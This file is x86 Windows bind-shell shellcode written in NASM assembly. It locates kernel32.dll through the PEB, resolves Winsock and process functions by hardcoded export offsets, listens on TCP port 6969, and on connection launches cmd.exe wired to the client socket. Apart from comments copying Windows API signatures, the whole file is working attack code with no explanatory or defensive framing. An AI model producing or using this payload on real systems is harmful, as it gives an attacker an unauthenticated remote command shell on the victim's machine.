section .text
	global _start
_start:

; Search for image base address of kernel32.dll via PEB, GetModuleHandle
xor ecx,ecx
mov eax,[fs:ecx+0x30] 				; PEB
mov eax,[eax+0xc] 				; PEB.Ldr
mov esi,[eax+0x14] 				; PEB.Ldr->InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
; Find functions
mov edi,[eax+0x10] 				; kernel32.dll base address
mov ebx,[edi+0x3c] 				; DOS->elf_anew
add ebx,edi 					; PE HEADER
mov ebx,[ebx+0x78] 				; Copy RVA of Export directory in EBX
add ebx,edi 					; kernel32 IMAGE_EXPORT_DIRECTORY
sub esp,32
lea esi,[esp]
mov cx,660
mov edx,[ebx+0x1c] 				; AddressOfFunctions
add edx,edi
mov eax,[edx+ecx]
add eax,edi 
mov [esi],dword eax 				; CreateProcessA() at offset 0
mov cx,1128
mov eax,[edx+ecx]
add eax,edi
mov [esi+4],dword eax 				; ExitProcess() at offset 4

;------------------------------------
; Finding base address of ws2_32.dll
mov cx,3312					; RVA buffer
mov eax,[edx+ecx]				; Relative calculcate offset via AddressOfFunctions
add eax,edi					; Increment address resulting in LoadLibraryA function address
xor ecx,ecx					; Clear reg

; HMODULE LoadLibraryA(
;   LPCSTR lpLibFileName
; );
push 0x41416c6c					; "llAA"
mov [esp+2],word cx				
push 0x642e3233					; "32.d"
push 0x5f327377					; "ws2_"
lea ebx,[esp]					; Load string pointer reference in EBX
push ebx					; lpLibFileName
call eax					; Call function
mov edi,eax					; Result of function in EAX, DLL Handle copied to EDI for further reference

; Parsing the DLL, walk the functions of ws2_32.dll
mov ebx,[edi+0x3c] 				; DOS->elf_anew
add ebx,edi 					; PE HEADER
mov ebx,[ebx+0x78] 				; Offset Export Table
add ebx,edi 					; ws2_32.dll IMAGE_EXPORT_DIRECTORY
mov edx,[ebx+0x1c] 				; AddressOfFunctions
add edx,edi					; Names Table
xor ecx,ecx
mov cx,456
mov eax,[edx+ecx]
add eax,edi
mov [esi+8],dword eax 				; WSAStartup() at offset 8
mov cx,392
mov eax,[edx+ecx]
add eax,edi
mov [esi+12],dword eax 				; WSASocketA() at offset 12
mov eax,[edx+4]
add eax,edi
mov [esi+16],dword eax 				; bind() at offset 16
mov eax,[edx+48]
add eax,edi
mov [esi+20],dword eax 				; listen() at offset 20
mov eax,[edx]
add eax,edi
mov [esi+24],dword eax 				; accept() at offset 24
mov eax,[edx+80]
add eax,edi
mov [esi+28],dword eax 				; setsockopt() at offset 28

;-------------------------------------------------
	; int WSAStartup(
	;   WORD      wVersionRequired,
	;   LPWSADATA lpWSAData
	; );
; WSAStartup(514, &WSADATA)
mov cx,400					; Reserve space for WSADATA
sub esp,ecx
lea ebx,[esp]					; Load PTR in EBX
mov cx,514					; wVersionRequired
push ebx
push ecx
call dword [esi+8]				; Call function

;-----------------------------------------
	; SOCKET WSAAPI WSASocketA(
	;   int                 af,
	;   int                 type,
	;   int                 protocol,
	;   LPWSAPROTOCOL_INFOA lpProtocolInfo,
	;   GROUP               g,
	;   DWORD               dwFlags
	; );	
; WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,NULL,NULL)
xor ecx,ecx
push ecx
push ecx
push ecx
mov cl,6
push ecx					; IPPROTO_TCP 6
sub ecx,5
push ecx					; Type = 1; SOCK_STREAM (TCP)
inc ecx						
push ecx					; AF_INET = 2
call dword [esi+12]				; Call function
mov edi,eax 					; Copy result of function in EAX in EDI for SOCKET, to be used in setsockopt

;----------------------------------
	; int setsockopt(
	;   SOCKET     s,
	;   int        level,
	;   int        optname,
	;   const char *optval,
	;   int        optlen
	; );
; setsockopt(sock,0xffff,4,&int l=1,int j=2)
cdq
mov dl,2
push edx
dec edx
push edx
lea ecx,[esp]
mov dl,4
push ecx
push edx
mov dx,0xffff
push edx
push edi
call dword [esi+28]

;--------------------------------------------
	; int bind(
	;   SOCKET         s,
	;   const sockaddr *addr,
	;   int            namelen
	; );
; bind(SOCKET,(struct sockaddr *)&struct sockaddr_in,16);
cdq
push edx
push edx
push edx
push edx
mov [esp],byte 2
mov [esp+2],word 0x391b 			; port 6969
lea ecx,[esp]
mov dl,16
push edx
push ecx
push edi
call dword [esi+16]				; Call function

;--------------------------------
	; int WSAAPI listen(
	;   SOCKET s,
	;   int    backlog
	; );
	; listen(SOCKET,1);
cdq
inc edx
push edx
push edi
call dword [esi+20]				; Call function

;-----------------------------
	; SOCKET WSAAPI accept(
	;   SOCKET   s,
	;   sockaddr *addr,
	;   int      *addrlen
	; );
; accept(SOCKET,(struct sockaddr *)&struct sockaddr_in,&16);
cdq
push edx
push edx
push edx
push edx
mov dl,16
lea ecx,[esp]
push edx
lea ebx,[esp]
push ebx
push ecx
push edi
call dword [esi+24]				; Call function
mov edi,eax 					; Copy result of function in EAX to EDI for Client socket

;-----------------------
	; typedef struct _PROCESS_INFORMATION {
	;   HANDLE hProcess;
	;   HANDLE hThread;
	;   DWORD  dwProcessId;
	;   DWORD  dwThreadId;
	; } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
cdq
sub esp,16
lea ebx,[esp] 				; PROCESS_INFORMATION

	; typedef struct _STARTUPINFOA {
	;   DWORD  cb;
	;   LPSTR  lpReserved;
	;   LPSTR  lpDesktop;
	;   LPSTR  lpTitle;
	;   DWORD  dwX;
	;   DWORD  dwY;
	;   DWORD  dwXSize;
	;   DWORD  dwYSize;
	;   DWORD  dwXCountChars;
	;   DWORD  dwYCountChars;
	;   DWORD  dwFillAttribute;
	;   DWORD  dwFlags;
	;   WORD   wShowWindow;
	;   WORD   cbReserved2;
	;   LPBYTE lpReserved2;
	;   HANDLE hStdInput;
	;   HANDLE hStdOutput;
	;   HANDLE hStdError;
	; } STARTUPINFOA, *LPSTARTUPINFOA;	
push edi
push edi
push edi
push edx
push edx
mov dl,255
inc edx
push edx
cdq
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
mov dl,68
push edx
lea ecx,[esp] 				; STARTUPINFOA
cdq
push 0x41657865				; "exeA"
mov [esp+3],byte dl
push 0x2e646d63 			; "cmd."
lea eax,[esp]

;---------------------------------------------
	; BOOL CreateProcessA(
	;   LPCSTR                lpApplicationName,
	;   LPSTR                 lpCommandLine,
	;   LPSECURITY_ATTRIBUTES lpProcessAttributes,
	;   LPSECURITY_ATTRIBUTES lpThreadAttributes,
	;   BOOL                  bInheritHandles,
	;   DWORD                 dwCreationFlags,
	;   LPVOID                lpEnvironment,
	;   LPCSTR                lpCurrentDirectory,
	;   LPSTARTUPINFOA        lpStartupInfo,
	;   LPPROCESS_INFORMATION lpProcessInformation
	; );
; CreateProcessA(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&STARTUPINFOA,&PROCESS_INFORMATION)
push ebx
push ecx
push edx
push edx
push edx
inc edx
push edx
cdq
push edx
push edx
push eax
push edx
call dword [esi]

;-----------------------
	; ExitProcess(0)
	; void ExitProcess(
	;  UINT uExitCode
	; );
; ExitProcess(0)
push eax
call dword [esi+4]

